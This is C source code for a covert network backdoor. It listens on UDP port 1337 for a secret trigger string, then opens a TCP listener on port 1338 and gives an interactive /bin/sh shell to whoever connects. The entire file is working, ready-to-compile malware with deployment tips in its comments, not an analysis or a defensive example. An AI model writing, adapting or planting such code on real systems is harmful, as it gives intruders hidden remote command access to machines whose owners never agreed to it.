#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define TRIGGER_PACKET "secret_trigger"
#define LISTEN_PORT 1337
#define BACKDOOR_PORT 1338

// Handles the connection and spawns a shell, this also handles redirecting of of stdin and stdout
void handleConnection(int clientSocket) {
	char *shell = "/bin/sh"; // Make sure you know your target binaries, you may need to change this.
	dup2(clientSocket, 0); // Redirect stdin
	dup2(clientSocket, 1); // Redirect stdout
	dup2(clientSocket, 2); // Redirect stderr
	execl(shell, shell, NULL); // Execute shell
}

// This handles starting the listener
void startBackdoor() {
	int sockfd, clientSocket;
	struct sockaddr_in serverAddr, clientAddr;
	socklen_t addr_size;

	// Create TCP socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		perror("Socket creation failed");
		exit(EXIT_FAILURE);
	}

	memset(&serverAddr, 0, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(BACKDOOR_PORT);
	serverAddr.sin_addr.s_addr = INADDR_ANY;

	// Bind socket
	if (bind(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
		perror("Bind failed");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	// Listen for connections
	if (listen(sockfd, 1) < 0) {
		perror("Listen failed");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	addr_size = sizeof(clientAddr);
	clientSocket = accept(sockfd, (struct sockaddr *)&clientAddr, &addr_size);
	if (clientSocket < 0) {
		perror("Accept failed");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	handleConnection(clientSocket);
	close(clientSocket);
	close(sockfd); // Close the backdoor socket after handling the connection
}

int main() {
	int sockfd;
	struct sockaddr_in serverAddr, clientAddr;
	socklen_t addr_size;
	char buffer[1024];

	while (1) {
		// Create UDP socket to listen for the trigger packet
		sockfd = socket(AF_INET, SOCK_DGRAM, 0);
		if (sockfd < 0) {
			perror("Socket creation failed");
			exit(EXIT_FAILURE);
		}

		memset(&serverAddr, 0, sizeof(serverAddr));
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(LISTEN_PORT);
		serverAddr.sin_addr.s_addr = INADDR_ANY;

		// Bind socket
		if (bind(sockfd, (const struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
			perror("Bind failed");
			close(sockfd);
			exit(EXIT_FAILURE);
		}

		addr_size = sizeof(clientAddr);
		int n = recvfrom(sockfd, (char *)buffer, 1024, 0, (struct sockaddr *)&clientAddr, &addr_size);
		buffer[n] = '\0';

		// Check for the trigger packet
		if (strcmp(buffer, TRIGGER_PACKET) == 0) {
			close(sockfd); // Close the UDP socket
			sleep(5); // Wait for 5 seconds before starting the backdoor
			startBackdoor();
		} else {
			close(sockfd); // Close the UDP socket if the packet does not match
		}
	}

	return 0;
}
